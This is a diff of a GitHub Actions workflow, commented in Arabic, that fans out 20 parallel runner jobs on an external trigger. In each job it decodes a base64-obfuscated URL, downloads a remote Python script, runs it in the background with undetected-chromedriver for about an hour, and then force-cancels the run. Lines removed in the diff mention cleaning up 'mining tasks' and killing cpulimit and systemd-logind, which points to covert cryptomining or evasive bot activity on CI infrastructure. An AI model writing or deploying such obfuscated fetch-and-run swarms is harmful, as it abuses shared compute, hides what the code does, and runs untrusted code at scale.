@@ -1,12 +1,12 @@
-name: Linux Swarm Execution Division
+name: Linux On-Demand Task Swarm
 
 on:
-  schedule:
-    # يعمل تلقائياً في الأوقات: 00:00، 08:00، 16:00 (بتوقيت UTC)
-    - cron: '0 0,8,16 * * *'
+  # استقبال أمر تشغيل خارجي عبر التوكن بكلمة التشغيل: start
+  repository_dispatch:
+    types: [start]
 
 concurrency:
-  group: swarm-division-${{ github.workflow }}-${{ github.ref }}
+  group: ondemand-swarm-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -15,105 +15,92 @@ permissions:
 
 jobs:
   # =================================================================
-  # مهمة المشرف العام: تراقب الوقت وتُنهي الـ workflow بالكامل بعد ساعة
+  # 【1】المشرف الزمني: يُنهي الـ workflow بالكامل بعد 65 دقيقة
   # =================================================================
-  global-supervisor:
-    name: "Global Time Enforcer"
+  temporal-overseer:
+    name: "Temporal Overseer"
     runs-on: ubuntu-latest
-    timeout-minutes: 65
+    timeout-minutes: 70
     steps:
-      - name: Enforce One-Hour Global Limit
+      - name: Enforce 65-Minute Termination
         run: |
-          echo "[ENFORCER] Global watchdog engaged. All jobs will be terminated after 60 minutes."
-          echo "[ENFORCER] Current run ID: ${{ github.run_id }}"
-          
-          # الانتظار لمدة 60 دقيقة (3600 ثانية)
-          sleep 3600
-          
-          echo "[ENFORCER] One-hour limit reached! Requesting full workflow cancellation..."
-          
-          # إرسال طلب إلغاء الـ workflow بالكامل
+          echo "[OVERSEER] المشرف الزمني نشط. سيتم إلغاء كل شيء بعد 65 دقيقة."
+          echo "[OVERSEER] معرف التشغيل: ${{ github.run_id }}"
+
+          # الانتظار لمدة 65 دقيقة كاملة (3900 ثانية)
+          sleep 3900
+
+          echo "[OVERSEER] انقضت الـ 65 دقيقة! جاري إصدار أمر الإلغاء الشامل..."
+
+          # إرسال أمر الإلغاء لجميع مهام الـ workflow
           curl -sS -X POST \
             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github+json" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
-          
-          echo "[ENFORCER] Cancellation request dispatched successfully."
+
+          echo "[OVERSEER] تم إرسال أمر الإلغاء بنجاح. إنهاء كل المهام المعلقة."
 
   # =================================================================
-  # المهمة الرئيسية: تشغيل الوحدات
+  # 【2】المهمة الرئيسية: تشغيل الوحدات العشرين
   # =================================================================
-  initiate-units:
-    name: "Division-${{ matrix.division_no }}"
+  deploy-swarm:
+    name: "SwarmUnit-${{ matrix.unit_slot }}"
     runs-on: ubuntu-latest
-    timeout-minutes: 60
+    timeout-minutes: 65
 
     strategy:
       fail-fast: false
       matrix:
-        division_no: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        unit_slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      # ☆ المرحلة الأولى: تجهيز البنية الأساسية
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      - name: Raise Foundation Layer
+      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
+      # 〈١〉 تجهيز البنية التحتية
+      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
+      - name: Provision Base Layer
         run: |
-          echo "[FOUNDATION] Erecting Division-${{ matrix.division_no }} on Linux..."
+          echo "[BASE] تجهيز SwarmUnit-${{ matrix.unit_slot }} على Linux..."
           sudo apt update -qq
-          sudo apt install -y cpulimit curl python3-pip
+          sudo apt install -y curl python3-pip
 
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      # ☆ المرحلة الثانية: استدعاء البرنامج التنفيذي
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      - name: Summon Runtime Binary
+      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
+      # 〈٢〉 استدعاء ملف المهمة الرئيسي
+      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
+      - name: Retrieve Task Payload
         run: |
-          echo "[SUMMON] Retrieving app_task.py from data vault..."
-          DATA_VAULT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$DATA_VAULT" -o app_task.py
-          echo "[SUMMON] Runtime binary cached locally."
+          echo "[RETRIEVE] جلب app_task.py من المصدر المشفر..."
+          SOURCE_LINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$SOURCE_LINK" -o app_task.py
+          echo "[RETRIEVE] تم حفظ الملف بنجاح."
 
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      # ☆ المرحلة الثالثة: تجهيز متطلبات بايثون
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      - name: Bind Python Requirements
+      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
+      # 〈٣〉 تثبيت حزم بايثون
+      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
+      - name: Install Python Modules
         run: |
-          echo "[BIND] Binding Python dependencies to runtime..."
+          echo "[MODULES] تثبيت مكتبات بايثون..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      # ☆ المرحلة الرابعة: التنفيذ تحت إشراف مؤقت
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      - name: Engage Task with Time Custodian
+      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
+      # 〈٤〉 التشغيل مع مراقبة داخلية حتى 65 دقيقة
+      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
+      - name: Launch Task Under Time Marshal
         run: |
-          echo ">> Engaging workload for Division-${{ matrix.division_no }}..."
-          
-          # إطلاق السكربت في الخلفية
-          python3 app_task.py &
-          DIVISION_PID=$!
-          
-          echo ">> Time custodian monitoring. Ceiling: 74 minutes."
-          
-          # الانتظار حتى استهلاك المدة المسموحة
-          sleep 4440
-          
-          # إنهاء العملية إن كانت لا تزال نشطة
-          if kill -0 $DIVISION_PID 2>/dev/null; then
-            echo ">> Ceiling surpassed! Aborting workload..."
-            kill -9 $DIVISION_PID
-            echo ">> Workload aborted by custodian."
-          else
-            echo ">> Workload completed within the ceiling."
-          fi
+          echo ">> إطلاق المهمة على SwarmUnit-${{ matrix.unit_slot }}..."
 
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      # ☆ المرحلة الخامسة: التنظيف وإغلاق الوحدة
-      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-      - name: Wipe and Stand Down
-        run: |
-          echo "[STANDDOWN] Division-${{ matrix.division_no }} preparing to stand down."
-          echo "[STANDDOWN] Wiping leftover cpulimit and mining tasks..."
-          sudo pkill -f cpulimit || true
-          sudo pkill -f systemd-logind || true
-          echo "[STANDDOWN] Division-${{ matrix.division_no }} stood down cleanly."
+          python3 app_task.py &
+          SWARM_PID=$!
+
+          echo ">> الحارس الزمني نشط. الحد الأقصى: 65 دقيقة (3900 ثانية)."
+
+          # الانتظار 65 دقيقة كاملة
+          sleep 3900
+
+          if kill -0 $SWARM_PID 2>/dev/null; then
+            echo ">> انقضت المهلة! جاري إيقاف المهمة..."
+            kill -9 $SWARM_PID
+            echo ">> تم إيقاف المهمة بقوة."
+          else
+            echo ">> انتهت المهمة داخل المهلة المحددة."
+          fi
